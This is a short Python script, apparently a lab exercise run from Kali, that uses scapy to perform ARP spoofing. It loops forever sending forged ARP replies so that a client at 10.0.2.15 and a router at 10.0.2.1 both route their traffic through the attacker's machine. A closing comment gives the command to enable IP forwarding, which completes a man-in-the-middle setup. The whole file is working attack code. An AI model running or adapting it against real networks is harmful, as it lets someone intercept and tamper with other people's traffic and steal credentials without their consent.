#!/usr/bin/env python

import time
import scapy.all as scapy

def scan(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_req
    # SEND AND RECEIVE
    ans_list = scapy.srp(arp_broadcast, timeout=5, verbose=False) [0] #only need element 0 from the 2 elements,no need of unanswered list
    return ans_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #hwsrc->mac of kali
    # op-> ARP response pdst-> IP Field Target hwdst->target mac psrc-> acting as router
    scapy.send(packet, verbose=False)

counter = 0
while True:
    spoof("10.0.2.15", "10.0.2.1")  #spoofing the client
    spoof("10.0.2.1", "10.0.2.15")  #spoofing the router
    counter = counter + 2
    print("\r[+] Packets sent " + str(counter), end="")
    time.sleep(2)

    # echo 1 > /proc/sys/net/ipv4/ip_forward  (for packet flow throgh kali)